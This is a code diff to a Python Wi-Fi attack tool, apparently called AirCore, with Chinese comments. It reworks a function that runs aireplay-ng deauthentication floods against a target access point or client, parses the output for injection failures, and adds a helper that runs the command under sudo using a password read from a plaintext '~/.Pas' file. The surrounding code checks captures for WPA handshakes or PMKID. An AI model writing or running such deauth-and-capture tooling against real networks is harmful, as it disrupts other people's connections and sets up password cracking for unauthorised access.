@@ -3,6 +3,7 @@ import re
 import sys
 import json
 import shutil
+import signal
 import subprocess
 import shlex
 import tempfile
@@ -704,30 +705,78 @@ class AirCore:
         只看到"一直抓不到"却没有任何线索。这里同步读取 aireplay-ng 输出
         并判定真实结果。"""
         cli = f" -c {client}" if client else ""
-        cmd = f"aireplay-ng --deauth {count} -a {bssid}{cli} {mon_iface}"
+        args = shlex.split(
+            f"aireplay-ng --deauth {count} -a {bssid}{cli} {mon_iface}")
         try:
-            r = self._run_sudo(shlex.split(cmd))
+            rc, out = self._run_deauth(args)
         except PermissionError as e:
             return False, f"deauth 需要提权: {e}"
-        except (OSError, subprocess.TimeoutExpired) as e:
-            return False, f"deauth 执行失败: {e}"
-        out = f"{r.stdout or ''}\n{r.stderr or ''}"
         low = out.lower()
-        if "no such bssid" in low:
-            return False, (f"deauth 注入失败: 找不到 {bssid} "
-                           f"(信道不符或目标已消失)")
+        if rc == -9:
+            # 超时被强杀: 本机 rtl8723be 等网卡压根不能注入, aireplay 发不
+            # 出去会一直挂住; 明确告知用户, 别再空转重发。
+            return False, ("deauth 注入超时: 当前网卡/驱动不支持帧注入, "
+                           "踢不动客户端, 需要换支持注入的外置 USB 网卡")
+        if "no such bssid" in low or "no bssid" in low:
+            return False, (f"deauth 找不到目标 {bssid} (信道不符或已消失)")
         if "no privilege" in low or "密码验证失败" in out:
             return False, "deauth 需要提权: 请检查 ~/.Pas 中的 sudo 密码"
-        if "not support" in low or "does not support" in low:
-            return False, "deauth 失败: 网卡/驱动不支持帧注入(无法踢客户端)"
-        if re.search(r"\bsending\b", low):
-            return True, (f"[deauth] 已发送 {count} 次解关联 → {bssid}"
+        if re.search(r"not support|no injection|send failed|write failed|"
+                     r"operation not permitted", low):
+            return False, "deauth 注入失败: 网卡不支持注入或信道不符"
+        if re.search(r"\bsending\b|deauth", low):
+            return True, (f"deauth 已发送 {count} 次 → {bssid}"
                           + (f" (定向 {client})" if client else " (广播)"))
-        if re.search(r"send failed|write failed|no injection|not support", low):
-            return False, ("deauth 注入失败: 网卡不支持注入或信道不符, "
-                           "可尝试换网卡/换信道")
-        tail = (r.stderr or r.stdout or "").strip().replace("\n", " ")[:80]
+        tail = out.strip().replace("\n", " ")[:80]
         return False, f"deauth 未确认发送: {tail or '无输出'}"
+
+    def _run_deauth(self, args: List[str], timeout: int = 8) -> Tuple[int, str]:
+        """带 sudo 运行 aireplay-ng, 超时用进程组强杀, 返回 (rc, 输出)。
+
+        _run_sudo 用 subprocess.run(timeout=10) 只能杀掉 sudo 包装进程, 孙
+        进程 aireplay-ng 会成为孤儿不断堆积 — 越跑越堵, 且永远拿不到输出。
+        这里 start_new_session=True 建新进程组, 超时 os.killpg 整组一起杀。
+        返回 rc=-9 表示超时被杀。测试可替换本方法。"""
+        pwd = self._get_sudo_password()
+        if pwd and not self._password_verified:
+            if self._verify_sudo_password(pwd):
+                self._password_verified = True
+                self.log("[sudo] 密码验证通过")
+            else:
+                self.log("[sudo] 密码验证失败: 请修正 ~/.Pas 中的密码后重试")
+                raise PermissionError("sudo 密码验证失败")
+        if not pwd:
+            self.log("[sudo] 无可用提权, 跳过 deauth")
+            return 1, "no privilege"
+        cmd = ["sudo", "-S", "-p", ""] + list(args)
+        try:
+            proc = subprocess.Popen(
+                cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT, text=True, bufsize=1,
+                encoding="utf-8", errors="replace", start_new_session=True)
+        except OSError as e:
+            return 1, f"启动失败: {e}"
+        try:
+            proc.stdin.write(pwd + "\n")
+            proc.stdin.close()
+        except OSError:
+            pass
+        try:
+            out, _ = proc.communicate(timeout=timeout)
+            return proc.returncode, (out or "")
+        except subprocess.TimeoutExpired:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+            except (OSError, ProcessLookupError):
+                try:
+                    proc.kill()
+                except OSError:
+                    pass
+            try:
+                out, _ = proc.communicate(timeout=2)
+            except (OSError, subprocess.TimeoutExpired):
+                out = ""
+            return -9, (out or "")
 
     def has_handshake(self, cap_file) -> bool:
         """校验 .cap/.pcap 里是否真的含 WPA/WPA2 四次握手(或 PMKID)。
